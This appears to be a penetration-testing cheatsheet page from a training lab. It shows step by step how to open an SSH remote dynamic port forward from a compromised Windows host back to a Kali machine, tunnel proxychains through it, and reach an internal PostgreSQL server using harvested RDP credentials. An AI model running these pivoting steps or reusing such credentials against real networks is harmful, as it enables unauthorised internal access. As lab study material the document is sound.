# SSH Remote Port Forwarding

The SSH remote dynamic port forward setup using the Windows OpenSSH client
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/ssh-exe-1.png)

Starting SSH server on the Kali machine
>``` shell
>kali@kali:~$ sudo systemctl start ssh  
>
># ========== Expected Result ==========
>[sudo] password for kali: 
># =====================================
>```

Connecting to the RDP server on MULTISERVER03 using xfreerdp
>``` shell
>kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64 
>
># ========== Expected Result ==========
>[15:46:35:297] [468172:468173] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
>[15:46:35:297] [468172:468173] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
>[15:46:35:300] [468172:468173] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
>[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
>[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
>[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - The hostname used for this connection (192.168.50.64:3389) 
>[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
>[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - Common Name (CN):
>[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] -    MULTISERVER03
>[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
>Certificate details for 192.168.50.64:3389 (RDP-Server):
>        Common Name: MULTISERVER03
>        Subject:     CN = MULTISERVER03
>        Issuer:      CN = MULTISERVER03
>        Thumbprint:  f5:42:78:8b:76:56:64:ba:05:73:75:c2:04:3c:74:56:6f:ba:d3:ed:f0:87:9e:ce:ee:9a:ba:e2:19:ff:56:df
>The above X.509 certificate could not be verified, possibly because you do not have
>the CA certificate in your certificate store, or the certificate has expired.
>Please look at the OpenSSL documentation on how to add a private CA to the store.
>Do you trust the above certificate? (Y/T/N) y
>[15:46:38:728] [468172:468173] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
>[15:46:39:538] [468172:468173] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
>[15:46:39:539] [468172:468173] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
>[15:46:40:175] [468172:468173] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
>[15:46:40:176] [468172:468173] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
>[15:46:42:254] [468172:468173] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
># =====================================
>```

Finding ssh.exe on MULTISERVER03
>``` shell
>C:\Users\rdp_admin>where ssh
>
># ========== Expected Result ==========
>C:\Windows\System32\OpenSSH\ssh.exe
># =====================================
>```

The version of OpenSSH client that is bundled with Windows is higher than 7.6
>``` shell
>C:\Users\rdp_admin>ssh.exe -V
>
># ========== Expected Result ==========
>OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
># =====================================
>```

Connecting back to our Kali machine to open the remote dynamic port forward
>``` shell
>C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4
>
># ========== Expected Result ==========
>The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
>ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.
>kali@192.168.118.4's password:
># =====================================
>```

Checking for the open SOCKS port on our Kali machine with ss
>``` shell
>kali@kali:~$ ss -ntplu
>
># ========== Expected Result ==========
>Netid     State      Recv-Q      Send-Q                Local Address:Port            Peer Address:Port     Process
>tcp       LISTEN     0           128                       127.0.0.1:9998                 0.0.0.0:*
>tcp       LISTEN     0           128                         0.0.0.0:22                   0.0.0.0:*
>tcp       LISTEN     0           128                           [::1]:9998                    [::]:*
>tcp       LISTEN     0           128                            [::]:22                      [::]:*
># =====================================
>```

Proxychains configuration file having been edited
>``` shell
>kali@kali:~$ tail /etc/proxychains4.conf 
>
># ========== Expected Result ==========
>#       proxy types: http, socks4, socks5, raw
>#         * raw: The traffic is simply forwarded to the proxy without modification.
>#        ( auth types supported: "basic"-http  "user/pass"-socks )
>#
>[ProxyList]
># add proxy here ...
># meanwile
># defaults set to "tor"
>socks5 127.0.0.1 9998
># =====================================
>```

Connecting to the PostgreSQL server with psql and Proxychains
>``` shell
>kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres  
>
># ========== Expected Result ==========
>[proxychains] config file found: /etc/proxychains4.conf
>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
>[proxychains] DLL init: proxychains-ng 4.16
>[proxychains] DLL init: proxychains-ng 4.16
>[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.50.215:5432  ...  OK
>Password for user postgres: 
>[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.50.215:5432  ...  OK
>psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
>SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
>Type "help" for help.
># =====================================
>
>postgres=# \l  
>
># ========== Expected Result ==========
>                                  List of databases
>    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
>------------+----------+----------+-------------+-------------+-----------------------
> confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
> postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
> template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
> template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
>(4 rows)
>
>postgres=# 
># =====================================
>```

Lab 1 - Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database (rdp_admin:P@ssw0rd!). Enumerate which port forwarding techniques are available, then use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.
>``` shell
>
>```
>
